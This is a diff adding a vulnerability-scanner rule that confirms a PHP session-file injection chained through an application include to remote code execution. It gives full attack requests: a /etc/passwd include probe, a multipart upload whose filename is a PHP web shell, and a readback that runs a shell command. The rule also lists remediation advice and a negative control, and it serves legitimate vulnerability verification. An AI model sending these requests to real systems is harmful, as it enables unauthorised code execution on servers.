@@ -1,0 +1,100 @@
+schema_version: 1
+id: "cortex.official:php2shell-session-lfi-rce"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.command_output_readback.v1"]
+info:
+  name: "php2shell session-file injection chained through an application include (CVE-2026-109618 / CVE-2026-109619)"
+  description: >
+    The PHP-core half of php2shell (CVE-2026-109618 / CVE-2026-109619) gives an attacker a poisoned session file:
+    session.use_only_cookies=0 makes PHP accept the session id from the multipart body, and the
+    session.upload_progress handler writes the unsanitised upload filename into that file verbatim. Execution needs a
+    SECOND condition that lives in the application — an include()/require() of a user-controlled path — so this rule
+    is deliberately separate from the affected-version signal rule: it only claims RCE where the chain is actually
+    demonstrated. It first proves the include route really includes files (a /etc/passwd read), then uploads a PHP
+    payload inside the filename, then reads the session file back through that same include and requires BOTH the
+    engine challenge nonce and the characteristic 'uid=' output, absent from a negative control (a session file that
+    does not exist) and absent from what we sent. If any link of the chain is missing, the rule reports NotApplicable
+    or NoMatch — never Confirmed.
+
+    The three variables below describe the ENGAGEMENT, not the CVE: point upload_route at an endpoint that runs
+    session_start(), lfi_route/lfi_param at the include the application exposes, and save_path/sid at the target's
+    session store. With the defaults it evaluates the php2shell lab only; against anything else the include probe
+    fails the preconditions and the rule is NotApplicable. session.upload_progress.cleanup=On (the php.ini default)
+    removes the file before the readback and yields NoMatch — an honest "not exploitable as configured here".
+  references:
+    - "https://github.com/ikow/php2shell-poc"
+    - "https://qideng.substack.com/p/php2shell-dissecting-phps-critical"
+  cves: ["CVE-2026-109618", "CVE-2026-109619"]
+  cwes: [94, 98, 200]
+  tags: ["php", "session", "upload-progress", "php2shell", "lfi", "rce", "lab"]
+  remediation: >
+    Remove the application include() on a user-controlled path (that alone ends this chain), then harden the
+    session layer: session.upload_progress.enabled=Off, session.use_strict_mode=On, and a session.save_path that
+    no include can reach. session.upload_progress.cleanup=On is NOT a defence: this rule reads sequentially, but a
+    concurrent include during a slow upload executes the same payload on a stock config (measured 186/186 hits). Patch PHP too (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12), but not as the fix for THIS chain:
+    measured on the 2026-10-21 lab, 8.2.35 and 8.4.27 still stored the raw PHP filename in the session file and
+    still honoured the multipart-body session id, and this rule still reached Confirmed against both. Only
+    use_strict_mode=On (with upload_progress=Off) stopped it. The upstream guard, php-src PR #22113, was still
+    open/unmerged when this was measured.
+finding:
+  sink_type: "CODE_EXEC"
+  impact: "RCE"
+  severity: "Critical"
+  # AC:H: exploitation needs the application-side include as well as the PHP-core flaw, so this is not a
+  # fire-and-forget network exploit like the Solr Velcocity template.
+  cvss_vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+  root_cause: "session-upload-progress-filename-injection-chained-to-application-include"
+execution:
+  auth: "anonymous"
+  side_effects: "remote_command"
+  transport: "http"
+  timeout_seconds: 20
+variables:
+  # Engagement inputs (see the description): the lab's defaults.
+  upload_route: { value: "index.php" }
+  lfi_route: { value: "vuln.php" }
+  lfi_param: { value: "page" }
+  lfi_probe: { value: "/etc/passwd" }
+  save_path: { value: "/tmp/sessions" }
+  sid: { value: "ggsecphp2shell000000000000" }
+# Gate: the include route must actually include a file. Without this the rule would run the whole chain against every
+# PHP target and report a confusing NoMatch; with it, a target that does not expose the include is NotApplicable.
+discovery:
+  - id: "include-route"
+    request:
+      method: "GET"
+      path: "/{{ variables.lfi_route }}?{{ variables.lfi_param }}={{ url_encode(variables.lfi_probe) }}"
+preconditions:
+  all:
+    - eq: { left: { ref: "steps.include-route.status" }, right: { value: 200 } }
+    - contains: { left: { ref: "steps.include-route.body" }, right: { value: "root:x:0:0:" } }
+steps:
+  # 1) Poison the session file: our SID in the body (use_only_cookies=0) and PHP code as the upload filename, which
+  #    upload_progress stores verbatim. `c` is read by the payload, so the command itself is supplied at readback time.
+  - id: "upload"
+    request:
+      method: "POST"
+      path: "/{{ variables.upload_route }}"
+      headers: { "Content-Type": "multipart/form-data; boundary=ggsec" }
+      body: "--ggsec\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n{{ variables.sid }}\r\n--ggsec\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nx\r\n--ggsec\r\nContent-Disposition: form-data; name=\"f\"; filename=\"<?php system($_GET['c']);?>\"\r\nContent-Type: application/octet-stream\r\n\r\nA\r\n--ggsec--\r\n"
+  # 2) Read the poisoned file back through the application include and run `echo <nonce>; id`. The response must carry
+  #    the nonce (the command really ran) and `uid=` (real command output), never present in what we sent.
+  - id: "readback"
+    request:
+      method: "GET"
+      path: "/{{ variables.lfi_route }}?{{ variables.lfi_param }}={{ url_encode(concat(variables.save_path, '/sess_', variables.sid)) }}&c={{ url_encode(concat('echo ', challenge.nonce, '; id')) }}"
+  # 3) Negative control: the same include of a session file that does not exist. It must show no command output.
+  - id: "control"
+    request:
+      method: "GET"
+      path: "/{{ variables.lfi_route }}?{{ variables.lfi_param }}={{ url_encode(concat(variables.save_path, '/sess_missing', variables.sid)) }}&c={{ url_encode(concat('echo ', challenge.nonce, '; id')) }}"
+proof:
+  kind: "command_output_readback.v1"
+  challenge: { kind: "nonce" }
+  readback:
+    step: "readback"
+    ref: "steps.readback.body"
+    marker: { regex: "uid=\\d+\\(" }
+  control: { step: "control" }
